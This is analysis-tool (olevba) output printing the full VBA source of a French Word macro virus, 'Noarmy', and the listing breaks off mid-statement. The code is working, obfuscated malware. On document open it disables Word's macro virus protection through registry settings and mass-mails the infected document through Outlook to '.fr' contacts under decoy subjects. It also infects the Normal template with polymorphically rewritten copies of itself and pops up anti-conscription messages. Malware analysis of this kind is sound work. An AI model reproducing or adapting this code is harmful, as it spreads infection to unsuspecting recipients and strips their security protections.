olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Noarmy
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO NOSN.cls 
in file: Virus.MSWord.Noarmy - OLE stream: 'Macros/VBA/NOSN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim h7, g8, j1, k2, j8, l1, m5, l8, a5, _
d3, g6, h3, k1, k5, g3, n6, h5, j5, k7: Dim e8, b9, a7, d6, c5, e2, g1, l3, l9, n2, m1, h8, l5, i1, i7, e4, c7, _
c4, f3, h1, d8: Dim g5, _
e1, m4, b3, d4, f7, i3, g2, e5, d2, a4, a3, a2, c2, d1, c3, c1, b2, b1, a1 ' nrotylgytee
Private Sub Document_Open() ' vkljft
On Error Resume Next: Call f1 ' aqbapxoroqvwzkm
Call f2 ' ufuv
Randomize: Select Case System.PrivateProfileString(j1, k2, j8) ' sneftrzdxprdbwr
Case Is <> j1 ' prnzbaoycly
System.PrivateProfileString(j1, k2, j8) = 1&: Case Else ' qpawhteutgnjmx
Options.ConfirmConversions = m5 ' piohsrspwkfgtl
Options.VirusProtection = m5 ' wxdqxnlngwqnwmk
Options.SaveNormalPrompt = m5: End Select: d8 = a5: Set c4 = CreateObject(d8) ' lhsjauxfiizadnw
Set f3 = c4.GetNameSpace(l8): Select Case System.PrivateProfileString(j1, d3, g6): Case Is <> h3: Select Case c4 ' pokieyiqafb
Case k1: f3.Logon k5, g3 ' fzwsekvovjumwzq
For i = 1 To f3.AddressLists.Count: Set g4 = f3.AddressLists(i) ' grkcmgai
Set h1 = c4.CreateItem(m5): h2 = g4.AddressEntries.Count ' bgguzxq
b6 = m5 ' kvkfpkqyipjdtp
For j = 1 To h2: Set j2 = g4.AddressEntries(j): Select Case Len(j2.Address): Case Is _
> 4: Select Case InStr(Len(j2.Address) - 3, j2.Address, n6, vbTextCompare) ' ofynhrtrmkzblo
Case Is <> 0 ' yoiniqmfzsojoyd
h1.Recipients.Add j2 ' iszxzsknurq
b6 = b6 + 1 ' wcwhhxegwg
End Select: End Select ' slgc
Select Case b6 ' jgvra
Case 50 ' hychgo
Exit For: End Select: Next j: Select Case Rnd(): Case Is < 0.33: h1.Subject = h5: h1.Body = j5 ' utrnojfdfgkjnn
Case Is < 0.66 ' roeeusoapnne
h1.Subject = g1 ' fuqjqdkgvcaufh
h1.Body = l3 ' avkjbahnlsaey
Case Else: h1.Subject = l9 ' elnelxuumd
h1.Body = n2 ' scqzhty
End Select: h1.Attachments.Add ActiveDocument.FullName ' cmtzpngqeei
h1.Send: Next i ' ozojl
f3.Logoff: End Select ' smtgixupguodf
System.PrivateProfileString(j1, d3, g6) = h3: End Select ' uiyawfv
Set n1 = ActiveDocument.VBProject: Set i6 = _
n1.VBComponents.Item(1): Set n1 _
= NormalTemplate.VBProject ' mvuhefepx
Set k3 = n1.VBComponents.Item(1): i2 = False: Select Case InStr(1, ActiveDocument.Name, m1): Case False: Select Case i6.Name ' jxddlhfccxxy
Case Is <> g6: Set b5 _
= k3: Set f5 = i6 ' gpzhxnymenrjryx
i2 = True ' fpjqqebpytzw
End Select: End Select: Select Case k3.Name ' cothmb
Case Is <> g6 ' mxivvkgror
Set b5 = i6: Set f5 = k3 ' pbpxygqemywws
i2 = True ' gvwfzszvm
End Select ' lfjonjgiz
Select Case i2: Case True: i4 _
= b5.CodeModule.CountOfLines - 1 ' wynohjmgwcg
c8 = f5.CodeModule.CountOfLines: Select Case c8 ' iadcnub
Case Is > _
0: f5.CodeModule.DeleteLines 1, c8: End Select ' iove
c6 = 1 ' lthq
c9 = "": j3 = "": a6 = 0 ' dysxmghewoelr
For l2 = 1 To i4: h4 = b5.CodeModule.Lines(l2, 1) ' ctbh
i = 1 ' acihnxfteblgde
f4 = InStr(1, h4, Chr(39)) ' mixzjqj
Select Case f4 ' kjhxbtokwotut
Case 0 ' tcclf
f4 = Len(h4): Case Else ' gkobo
f4 = f4 - 2: End Select: Do ' qyrbbyfgqzzne
j = InStr(i, h4, Chr(32)): Select Case j ' npevw
Case 0: j = Len(h4) + 1 ' bhrujzdylhzo
b8 = True ' pyjcogbhesuf
Case f4 + 1: b8 = True ' lwlhje
Case Else ' ertgcioslly
b8 = False ' biljksmdqismt
End Select: n5 = Mid(h4, i, j - i) ' czrvaeobz
Select Case b8: Case True ' bdgxftgmxphz
f6 = b5.CodeModule.Lines(l2 + 1, 1) ' piknl
k4 = InStr(1, f6, Chr(32)) ' dkateku
Select Case k4: Case 0: j3 = _
"": Case Else ' vkigfkzl
j3 = Mid(f6, 1, k4 - 1) ' bzto
End Select: End Select ' kkxeqbhjgvg
Select Case n5: Case k7 + Chr(58): n5 = e8 + Chr(58): Case e8 + Chr(58) ' kmonhjq
n5 = k7 + Chr(58) ' ykaewtxctjnfu
Case k7 ' mmuwski
n5 = e8: Case e8 ' rdyimwntbzzdup
n5 = k7 ' pfovdg
End Select ' izqznso
Select Case h6: Case False: Select Case Rnd() ' pxmytuxrzhbjpm
Case Is _
< 0.02: h6 = True ' vuouikpjyvqki
Case Else ' bxumhidsun
h6 = False: Select Case b8: Case True ' ximlosne
Select Case l2: Case i4: h6 = True ' ukrhdqkbcbit
End Select ' dsxtqfpnagdah
Select Case Rnd(): Case Is < 0.5: h6 = True: End Select ' lofmmb
Select Case j3 ' qwxsvdyklpcnqk
Case e4: h6 = True: a6 = a6 + 1: Select Case a6 ' frixjsbnsnlgwi
Case 4: l2 = i4 ' eiumkcdqoerasy
End Select: End Select: Select Case InStr(1, h4, c7) ' djpp
Case Is <> 0 ' kwpcarmzg
Select Case n5 ' fkdlogc
Case j17: h6 = False ' zznjsktlkxtxot
Case Else ' rdibpn
h6 = True: End Select: End Select ' pjphqdwbxwp
End Select ' fxgrs
End Select ' pcdczi
Select Case Len(n5): Case Is <> 0 ' nsuzvvknfxw
Select Case InStr(Len(n5), n5, Chr(58)): Case Is <> 0 ' wxwlmnsecyftf
Select Case Rnd(): Case Is < 0.5: h6 = True: End Select ' qrcgwqocyza
End Select ' tzqezmohimrz
End Select ' wmuxgdsxicq
Case Else ' coimtgi
h6 = False ' qklzi
End Select: Select Case _
b8: Case True: Select Case n5 ' wtfhsyotfdzqca
Case Chr(95) ' odebuel
c9 = c9 + Switch(h6 = True, Chr(95), h6 = False, j1) ' ptthagd
j4 = False: Case Else: c9 = c9 + Switch(h6 = True, n5, h6 = False, n5 + Chr(58) + Chr(32)) ' oxmizurpamfmf
j4 = True ' grefpmnfdr
End Select ' lmjvtsmflhvfn
Case Else: Select Case InStr(Len(n5), n5, Chr(58)) ' mcorocefc
Case 0 ' zamzhrx
c9 = c9 + Switch(h6 = True, n5 + Chr(32) + Chr(95), h6 = _
False, n5 + Chr(32)) ' azahpf
j4 = False ' hodcbohgu
Case Else: c9 = c9 + Switch(h6 = True, Mid(n5, 1, Len(n5) - 1), h6 = False, n5 + Chr(32)): j4 = True: End Select ' uyenaouvt
End Select ' ranwqmmbxjulfh
Select Case h6 ' rukocmqzlvwuw
Case True: Select Case j4 ' axzdoqvsoukifq
Case True ' rxvftkeu
c9 = c9 + Chr(32) + Chr(39) + Chr(32) ' gpjdksvvpxec
e6 = Int((12 * Rnd) + 4): For d5 = 1 To e6 ' afoyaqetrsf
c9 = c9 + Chr$(Int((26 _
* Rnd) + 97)) ' dcvqgpl
Next d5 ' sxdkcdozybvfjt
End Select: f5.CodeModule.InsertLines c6, _
c9: c6 = c6 + 1: c9 = "": End Select ' luhjxr
i = _
j + 1: Select Case b8: Case True: Exit Do: End Select: Loop ' sqvf
Next l2: Select Case k3.Name ' fvptnouio
Case Is <> g6: f5.Name = g6 ' durejfdv
NormalTemplate.Save: End Select: Select Case i6.Name: Case Is <> g6 ' vvdppxfyfp
f5.Name = g6 ' tnuvtveywbvztsl
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName ' ubgwo
ActiveDocument.Saved = True: End Select: Case Else ' loqyjjatjjap
Select Case InStr(1, ActiveDocument.Name, m1) ' zrthwf
Case False ' arcd
Select Case Rnd() ' prktvdsyaktq
Case Is < 0.015: MsgBox h8 + l5 + i1 + i7, _
32: MsgBox g5 + e1 + m4 + b3 + d4 + f7, 16: MsgBox i3 + g2 + e5 + d2 + a4, 16: MsgBox a3 + a2 _
+ c2 + d1 + c3, 16 ' silhjpgfuedwdo
MsgBox c1 + _
b2, 16: MsgBox b1 + a1, 48 ' geuoghg
Case Is < 0.03 ' xmpzesuu
Selection.TypeText b9 ' vojcuo
Case Is < 0.045 ' cmegojyyubes
Selection.TypeText a7: Case Is < 0.06: Selection.TypeText d6 ' igszwgfelhcaxc
Case Is < 0.075: Selection.TypeText c5 ' dpfyaeyscwzc
Case Is < 0.09 ' vfwoqhncpwovaxq
Selection.TypeText e2 ' maeytzmtgrvo
End Select: ActiveDocument.SaveAs _
FileName:=ActiveDocument.FullName: ActiveDocument.Saved = True ' bdvxgyomlxjhpx
End Select ' rfupa
End Select: End Sub ' dgdsqhpsmc
Private Sub f1(): h7 = Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111): g8 = _
Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121) + Chr(46) + Chr(46) + Chr(46): j1 = "" ' qxklu
k2 = Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(67) + Chr(85) + _
Chr(82) + Chr(82) _
+ Chr(69) + Chr(78): k2 = k2 + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + Chr(102): k2 = k2 + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) ' euvz
k2 = k2 + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) _
+ Chr(79) + Chr(102) + Chr(102) + Chr(105): k2 = k2 + Chr(99) + Chr(101) + Chr(92) + Chr(57) + _
Chr(46) + Chr(48) + Chr(92) + Chr(87) + Chr(111) + Chr(114) ' owybhthosiibhie
k2 = k2 + Chr(100) + Chr(92) + Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121) ' cvsvs
j8 = Chr(76) + Chr(101) + Chr(118) + Chr(101) + _
Chr(108): l1 = Chr(84) + Chr(111) + Chr(111) + _
Chr(108) + Chr(115): m5 = 0 ' drrzlpnracimw
l8 = Chr(77) + _
Chr(65) + Chr(80) + Chr(73): a5 = Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107) + Chr(46) + Chr(65) + Chr(112): a5 = a5 + Chr(112) _
+ Chr(108) + Chr(105) + Chr(99) _
+ Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) ' hignccwjyqbqzg
d3 = Chr(72) + Chr(75) + _
Chr(69) + Chr(89) + Chr(95) + Chr(67) + Chr(85) + Chr(82) + Chr(82) + Chr(69) + Chr(78) ' coghqjb
d3 = d3 + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + Chr(102): d3 = d3 + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114): d3 = d3 + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105): d3 = d3 + Chr(99) + Chr(101) + Chr(92) ' aofaegotxort
g6 = Chr(78) + Chr(79) _
+ Chr(83) + Chr(78) ' eqbkutau
h3 = "Non" + Chr(32) + "au" _
+ Chr(32) + "Service" + Chr(32) + "National" + Chr(32) + "-" + Chr(32) + "Oui" + Chr(32) ' ifpmdwmf
h3 = h3 + "au" + Chr(32) + "Contrat" + Chr(32) + "de" + Chr(32) + "Travail": k1 = Chr(79) + Chr(117) _
+ Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107): k5 = Chr(112) + Chr(114) + Chr(111) + Chr(102) + Chr(105) + Chr(108) + Chr(101): g3 = Chr(112) + Chr(97) + Chr(115) + Chr(115) + Chr(119) + Chr(111) + Chr(114) + Chr(100) ' aeffticvz
n6 = _
Chr(46) + Chr(102) + Chr(114) ' gjfcod
h5 = "Suggestion..." ' poqasbvnatfhh
j5 = "Ce" + Chr(32) + "document" + Chr(32) + "(" + ActiveDocument.Name + ")" + Chr(32) + "vaut" + Chr(32) + "bien" ' prnpmqb
j5 = j5 + Chr(32) + "un" + Chr(32) + "petit" + Chr(32) + "coup" + Chr(32) + "d" + Chr(39) + "oeil." + Chr(13) + "J" + Chr(39) + "aimerais": j5 = j5 + Chr(32) + "savoir" + Chr(32) + "s" + Chr(39) + "il" + Chr(32) + "correspond" + Chr(32) + "à" + Chr(32) + "ce" + Chr(32) ' uotdsswhaur
j5 = j5 + "qu" + Chr(39) + "on" + Chr(32) + "attends" + Chr(32) + "de" + Chr(32) + "lui." + Chr(13) ' xzdvtqzwv
k7 = Chr(68) + Chr(111) + Chr(99) + _
Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(95): k7 = k7 + Chr(67) + Chr(108) + Chr(111) + Chr(115) + Chr(101) + Chr(40) + Chr(41) ' eoszzwfv
e8 = Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116): e8 = e8 + Chr(95) + Chr(79) + Chr(112) + Chr(101) + Chr(110) + Chr(40) + Chr(41): b9 = Chr(32) + "http://sn.agat.net" + Chr(32) ' zbxtyg
a7 = Chr(32) + "http://altern.org/gigm/service.htm" + Chr(32): d6 = Chr(32) + "http://www.donquichotte.com" + Chr(32) ' psdwioytuz
c5 = Chr(32) + "http://www.multimania.com/antisn" _
+ Chr(32) ' hhzydsckjjdl
e2 = Chr(32) + "Oui" + Chr(32) + "à" + Chr(32) + "l" + Chr(39) + "Emploi," + Chr(32) + "Oui" + Chr(32) + "à" + Chr(32) + "l" + Chr(39) + "armée" + Chr(32): e2 = e2 + "de" + Chr(32) + "métier," + Chr(32) + "mais" + Chr(32) + "Non" + Chr(32) + _
"au" + Chr(32) + "service": e2 = e2 + Chr(32) + "national" + Chr(32) + "sous" + Chr(32) + "contrat" + Chr(32) + "de" + Chr(32) + "travail," + Chr(32): e2 = e2 + "Non" + Chr(32) + "à" + Chr(32) + "l" + Chr(39) + "absurdité." + Chr(32): g1 = "Un" + Chr(32) + "peu" + Chr(32) + "d" + Chr(39) + "aide..." ' dcmfgmfncdc
l3 = "Je" + Chr(32) + "dois" + Chr(32) + "avouer" + Chr(32) + "que" + Chr(32) + "j" + Chr(39) + "ai" + Chr(32) _
+ "un" + Chr(32) + "peu" ' bgdodebe
l3 = l3 + Chr(32) + "de" + Chr(32) + "mal" + Chr(32) + "à" + Chr(32) + "peaufiner" + Chr(32) + "ce" + Chr(32) + "document": l3 = l3 + Chr(32) + _
"(" + ActiveDocument.Name + ")." + Chr(13) + "Merci" _
+ Chr(32) + "de" + Chr(32) + "m" + Chr(39) + "aider" + Chr(32): l3 = l3 + "un" + Chr(32) + "peu" + Chr(32) + "pour" + Chr(32) + "l" + Chr(39) + "améliorer..." + Chr(13) ' mjgqibxzuh
l9 = "Version" _
+ Chr(32) + "finale": n2 _
= "Voici" + Chr(32) + _
"la" + Chr(32) + "dernière" + Chr(32) + "version" + Chr(32) + "de" + Chr(32) + "ce" + Chr(32): n2 = n2 + "sur" + Chr(32) + "quoi" + Chr(32) + "j" + Chr(39) + "ai" + Chr(32) + "travaillé" + Chr(32) + "ces" + Chr(32) + "derniers": n2 = n2 + Chr(32) + "temps" + Chr(32) + "(" + ActiveDocument.Name + ")." + Chr(13) + "Tous" + Chr(32) + "les" + Chr(32) ' unwybvsirgc
n2 = n2 + "avis" + Chr(32) + "sont" + Chr(32) _
+ "la" + Chr(32) + "bienvenue" + Chr(32) + "!" + Chr(13): m1 = "Document": h8 = "Le" + Chr(32) + "mystère" + Chr(32) + "du" + Chr(32) + "jour" + Chr(32) _
+ "à" + Chr(32) + "résoudre" + Chr(32) + "est" + Chr(32): h8 = h8 + "le" + Chr(32) + "suivant:" + Chr(13) + Chr(13) ' toay
End Sub ' vkyfojyynbgbfe
Private Sub f2(): l5 = "Lors" + Chr(32) + "de" + Chr(32) + "son" + Chr(32) + "intervention" + Chr(32) + "télévisée" + Chr(32) + "du" + Chr(32) + "22" + Chr(32): l5 = l5 + "février" + Chr(32) + "1996," + Chr(32) + "Jacques" _
+ Chr(32) + "Chirac," + Chr(32) + "Président" + Chr(32) + "de" + Chr(32) + "la": l5 = _
l5 + Chr(32) + "République" + Chr(32) + "et" + Chr(32) + "Chef" + Chr(32) + "des" + Chr(32) + "Armées," + Chr(32) + _
"a" + Chr(32) + "proclamé:" + Chr(32) ' lcadzs
i1 = """Nous" + Chr(32) + "n" + Chr(39) + "avons" + Chr(32) + "plus" + Chr(32) + "besoin" + Chr(32) + "d" + Chr(39) + "appelés..." + Chr(32) + "(Le" + Chr(32) + "service" + Chr(32): i1 = i1 + "national)" + Chr(32) + "est" + Chr(32) + "devenu" + Chr(32) + "inégal" + Chr(32) + "et" + Chr(32) + "il" + Chr(32) + "n" + Chr(39) + "est" + Chr(32) + "plus" ' xkinuljkrqo
i1 = i1 + Chr(32) + "universel.""" + Chr(32) + "Le" + Chr(32) + "Service" + Chr(32) + "National" + Chr(32) + "a" + Chr(32) + "ensuite" + Chr(32) + "été" ' ulhawoh
i1 = i1 + Chr(32) + "supprimé" + Chr(32) + "pour" + Chr(32) + _
"tous..." + Chr(32) + "ou" + Chr(32) + "presque:" + _
Chr(32): i7 _
= "Alors" + Chr(32) + "qu" + Chr(39) + "il" + Chr(32) + "n" + Chr(39) + "est" _
+ Chr(32) + "plus" _
+ Chr(32) + "obligatoire" + Chr(32) + "pour" + Chr(32) + "les" + Chr(32) + "gens": i7 = i7 + Chr(32) + "nés" + Chr(32) + "après" + Chr(32) + "1979," + Chr(32) + "les" + Chr(32) + "gens" + _
Chr(32) + "nés" + Chr(32) + "avant" + Chr(32): i7 = i7 + "1979" + Chr(32) + "peuvent" + Chr(32) + _
"encore" + Chr(32) + "perdre" + Chr(32) + "emploi," + Chr(32) + "appartement," + Chr(32) + "vie" + Chr(32) ' qiavnfxaxmd
i7 = i7 + "de" + Chr(32) + "famille" + Chr(32) + "sur" + Chr(32) + "simple" + Chr(32) + "ordre" + Chr(32) + _
"du" + Chr(32) + "Service" + Chr(32) + "National.": g5 _
= "En" + Chr(32) + _
"réalité," + Chr(32) + "la" + Chr(32) + "situation" + Chr(32) + "actuelle" + Chr(32) + "est" + _
Chr(32) + "bien" + Chr(32) + "pire" + Chr(32): g5 = g5 + "encore:" + Chr(32) + "Après" + Chr(32) + "avoir" + Chr(32) + "accordé" + Chr(32) + "un" + Chr(32) + "report" + Chr(32) + "d" + Chr(39) + "incorporation" + Chr(32) ' dqpnpsopd
g5 = g5 + "de" + Chr(32) + "2" + Chr(32) + "ans" + Chr(32) + "aux" _
+ Chr(32) ' zhabrgxcqedwc
e1 = "jeunes" + Chr(32) + "ayant" + _
Chr(32) + "obtenu" + Chr(32) + "Contrat" + Chr(32) + "de" + Chr(32) + "Travail," + Chr(32) + "l" _
+ Chr(39) + "Armée" + Chr(32) + "a" + Chr(32) ' eprmlebhhyzcjo
e1 = e1 + "l" + Chr(39) + "intention" + Chr(32) + "de" + Chr(32) + "les" + Chr(32) + "rappeler" + Chr(32) + "au" + Chr(32) + "beau" + Chr(32) + "milieu" + Chr(32) + "de" + Chr(32) ' btihhyqlgjv
e1 = e1 + "leur" + Chr(32) + "carrière" + Chr(32) + "professionnelle." + Chr(32) + "Les" + Chr(32) + "implications" _
+ Chr(32) + "sont" + _
Chr(32) + "bien" + Chr(32): e1 = e1 + "sûr" + Chr(32) + "catastrophiques:" + Chr(13) + Chr(13): m4 = Chr(32) + Chr(32) + "-" _
+ Chr(32) + "Vivre" + Chr(32) + "sans" + Chr(32) + "salaire" + Chr(32) + _
"pendant" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "ne" ' brtlvqdzneb
m4 = m4 + Chr(32) + "permet" + Chr(32) + "pas" + Chr(32) + "d" + Chr(39) + "assurer" + _
Chr(32) + "engagements," + Chr(32) + "dettes" + Chr(32) + "et" + Chr(32): b3 = "impôts" + _
Chr(32) + "qui" + Chr(32) + "sont" + Chr(32) + "déjà" + Chr(32) + "difficiles" _
+ Chr(32) + "à" + Chr(32) + _
"assumer" + Chr(32) + "dans" + Chr(32) + "un": b3 = b3 + Chr(32) + "début" + Chr(32) + "de" + _
Chr(32) + "vie" + Chr(32) + "active" + Chr(32) + "normal." + Chr(13) + Chr(13): d4 = Chr(32) + Chr(32) + "-" + Chr(32) + "Ne" + Chr(32) + "pas" + Chr(32) + "pratiquer" + Chr(32) + "son" + Chr(32) + "activité" + Chr(32) + "professionnelle" + Chr(32): d4 = d4 + "pendant" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) _
+ "implique" + Chr(32) + "également" + Chr(32) + "une" + _
Chr(32) + "perte" + Chr(32) + _
"d" + _
Chr(39) + "expérience": d4 = d4 + Chr(32) + "utile," + Chr(32) + "la" + Chr(32) + "nécessité" + Chr(32) + "d" + Chr(39) _
+ "une" + Chr(32) + "période" + Chr(32): f7 = "de" _
+ Chr(32) + "réadaptation," + Chr(32) + "une" + Chr(32) + "modification" + Chr(32) + "de" + Chr(32) + "son" + Chr(32) + "projet" _
+ Chr(32) + "professionnel": f7 = f7 + Chr(32) + _
"et" + Chr(32) _
+ "bien" + Chr(32) + "sûr" + Chr(32) + "l" + Chr(39) + "inquantifiable" + Chr(32) + "colère" + Chr(32) _
+ "des" + Chr(32) + "employeurs," + Chr(32) ' bldqyndjdyycsiy
f7 = f7 + "qui" + Chr(32) + "se" + Chr(32) + "traduira," + Chr(32) + "intentionnellement" + Chr(32) + "ou" + Chr(32) + "non," + Chr(32) + "par" + Chr(32) + "un" + Chr(32) ' gmtcrkptirebn
f7 = f7 + "ralentissement" + Chr(32) + "dans" + Chr(32) + "l" + Chr(39) + "évolution" + Chr(32) + "de" _
+ Chr(32) + "carrière." ' lbeewwxxbhrrauh
i3 = Chr(32) _
+ Chr(32) + "-" + Chr(32) + "Du" + Chr(32) + "fait" + Chr(32) + "qu" + Chr(39) + "il" + Chr(32) + "soit" + _
Chr(32) + "tout" + Chr(32) + "bonnement" + Chr(32) + "impossible": i3 = i3 + Chr(32) + "d" + Chr(39) + "assurer" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "de" + Chr(32) + "loyer" + Chr(32) + _
"sans" + Chr(32) + "salaire" + Chr(32) + "sur" + Chr(32): i3 = i3 + "cette" _
+ Chr(32) + "période," _
+ Chr(32) ' lypfvwtzyprhe
g2 = "l" + Chr(39) + "abandon" + Chr(32) + "du" _
+ Chr(32) + "logement" + Chr(32) + "est" + Chr(32) + "irrémédiable." + Chr(32) + "Qui" + Chr(32) + "prendra" + Chr(32) + "alors" + Chr(32) ' rvrtfqa
g2 = g2 + "en" + Chr(32) + "charge" + Chr(32) + "les" + Chr(32) + _
"frais" + Chr(32) _
+ "de" + Chr(32) + "déménagement," + Chr(32) + "de" + Chr(32) + "garde-meuble" + Chr(32): g2 = g2 + "et" + Chr(32) + _
"de" + Chr(32) + "recherche" + Chr(32) + "d" + Chr(39) + "un" + Chr(32) + "nouvel" + Chr(32) + "appartement?" + Chr(13) + Chr(13) ' qbfcbftqeadn
e5 = Chr(32) + Chr(32) + "-" _
+ Chr(32) + "Et" + Chr(32) + "que" + Chr(32) + "dire" + Chr(32) + "de" + Chr(32) + _
"la" + Chr(32) + "situation" + Chr(32) + "morale" + Chr(32): e5 = e5 + "au" + Chr(32) + "plus" + Chr(32) + "bas" + Chr(32) + "durant" + _
Chr(32) + "ces" + Chr(32) + "10" + Chr(32) + _
"longs" + Chr(32) + _
"mois" + Chr(32) + "?" + Chr(32) ' rkzfyzgpke
e5 _
= e5 + "Le" + Chr(32) + "rêve" + Chr(32) + "de" + Chr(32) + "vie" + Chr(32) + "que" + _
Chr(32) + "l" + Chr(39) + "on" + Chr(32) + "était" + Chr(32) + "entrain" + Chr(32) + "de" + Chr(32): e5 = e5 + "bâtir" + Chr(32) + "s" + Chr(39) + "effondre" + Chr(32) + "pour" + Chr(32) + "laisser" + Chr(32) + "place" ' prepxxdvbzn
d2 = Chr(32) _
+ "aux" + Chr(32) + "corvées" + Chr(32) + "inutiles" + Chr(32) + "et" + Chr(32) + "a" + Chr(32) + "l" + Chr(39) + "ennui" + Chr(32) + "bien" + Chr(32) + "connu" + Chr(32) + "du" ' hqwa
d2 = d2 + _
Chr(32) + "Service" + Chr(32) + "National." + Chr(32) + "Est-il" + Chr(32) + "possible" + Chr(32) + "de" + Chr(32) + "rester" + Chr(32) + "loin" + Chr(32) + "de" ' omqdb
a4 = a4 + Chr(32) + "la" + Chr(32) + "personne" + Chr(32) + "avec" + _
Chr(32) + "qui" + Chr(32) + "l" + Chr(39) + "on" + Chr(32) + "vie," + Chr(32) + "de" _
+ Chr(32) + "ses" + Chr(32) + "relations," + Chr(32) + "de": a4 = Chr(32) + "ses" + _
Chr(32) + "amis," + Chr(32) + "pendant" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "puis" + Chr(32) + "de" + Chr(32) + "reprendre" + Chr(32) + "comme" + Chr(32) + "si": a4 = _
a4 + Chr(32) + "rien" + Chr(32) + "ne" + Chr(32) + "s" + Chr(39) + "était" + Chr(32) + "passé" + Chr(32) + _
"?": a3 = "Certains" + Chr(32) + "diront" + Chr(32) + "que" + Chr(32) + "le" + Chr(32) + "Service" _
+ Chr(32) + "National" + Chr(32) + "fait" + Chr(32) + "partie" + Chr(32) + "du" + Chr(32) + "devoir": a3 = a3 + Chr(32) + "de" + Chr(32) + "citoyen." + Chr(32) + "Mais" + Chr(32) + "servir" + Chr(32) + "son" + Chr(32) + "pays" + Chr(32) + "c" + Chr(39) + "est" + Chr(32) + "d" + Chr(39) + "abord" + Chr(32) + "payer" + Chr(32) ' ltyaxgtome
a3 = a3 + "ses" _
+ Chr(32) + "impôts," + Chr(32) + "participer" + Chr(32) + "aux" + _
Chr(32) + "frais" + Chr(32) + "de" + Chr(32) + "la" + Chr(32) + "sécurité" + Chr(32) + "sociale," + Chr(32) + "des": a3 = a3 + Chr(32) + "allocations" + _
Chr(32) + "chômage," ' rogufz
a2 = Chr(32) + "des" + Chr(32) + "retraites," + Chr(32) + "etc." + Chr(32) + "Ce" + Chr(32) + "sont" + Chr(32) + "bien" + Chr(32) + "sûr" + Chr(32) + "les" _
+ Chr(32) + "personnes" + Chr(32) + "qui" ' ntda
a2 = a2 _
+ Chr(32) + "travaillent" + Chr(32) + "qui" + Chr(32) _
+ "payent" + Chr(32) + "tout" + Chr(32) + "cela," + Chr(32) + "et" + Chr(32) + "les" + Chr(32) + "actuels" + Chr(32) + "sursitaires": a2 = a2 + Chr(32) + "en" + Chr(32) + "font" + Chr(32) _
+ "partie." + Chr(32) + "Ils" + Chr(32) + "sont" + Chr(32) + "bien" + Chr(32) + "plus" + Chr(32) + "utiles" + Chr(32): c2 = "à" + _
Chr(32) + "la" + Chr(32) + "nation" + Chr(32) + "en" + Chr(32) + "tant" + Chr(32) + "que" + Chr(32) + _
"cotisants" + Chr(32) + "qu" + Chr(39) + "en" + Chr(32) + "tant" + Chr(32) + "qu" + Chr(39) + "appelés" + Chr(32): c2 = _
c2 + "du" + Chr(32) + "contingent." + Chr(13) + Chr(13) ' ngxtogztfmr
d1 = "Le" + Chr(32) + "service" + Chr(32) + "national" _
+ Chr(32) + "prétends" + Chr(32) + "aujourd" + Chr(39) + "hui" + _
Chr(32) + "que" + Chr(32) + "la" + Chr(32) + "vie" + Chr(32) + "reprends" _
+ Chr(32) + "son" ' fepgrteszawkwsa
d1 = d1 + Chr(32) + "cour" + Chr(32) + "normalement" + Chr(32) + "après" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "de" + Chr(32) + "service" + Chr(32) + "au" + Chr(32) + "milieu" + Chr(32): d1 = d1 + "d" + Chr(39) + "un" + Chr(32) + "Contrat" + Chr(32) + "de" + Chr(32) + "Travail." + Chr(32) + "C" + Chr(39) + "est" + Chr(32) + "bien" + Chr(32) + "sûr" + Chr(32) + "un" + Chr(32) + "véritable" + Chr(32) + "utopisme": d1 = d1 + Chr(32) + "et" + Chr(32) + "le" + _
Chr(32): c3 _
= "bilan" + Chr(32) + "ne" + Chr(32) + "se" + Chr(32) + "résume" + Chr(32) + "pas" + Chr(32) + "à" + Chr(32) + "une" + Chr(32) + "perte" + Chr(32) + "de" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) ' dzycin
c3 = c3 + "de" _
+ Chr(32) + "temps:" + Chr(32) + "C" + Chr(39) + "est" _
+ Chr(32) + "une" + Chr(32) + "véritable" + Chr(32) + "catastrophe" + Chr(32) + "pour" + Chr(32) + _
"la" + Chr(32) + "situation" + Chr(32) + "financière,": c3 _
= c3 + Chr(32) + "matérielle" + Chr(32) _
+ "et" + Chr(32) + "morale" + Chr(32) + "de" + Chr(32) + "l" + Chr(39) + "individu," + Chr(32) + "qui" + Chr(32) + "aura" + Chr(32) _
+ "des" + Chr(32) + "répercutions" _
+ Chr(32) ' anfnz
c3 = c3 + "regrettables" + Chr(32) + "et" + Chr(32) + "durables.": c1 = _
"Ils" + Chr(32) + "sont" + _
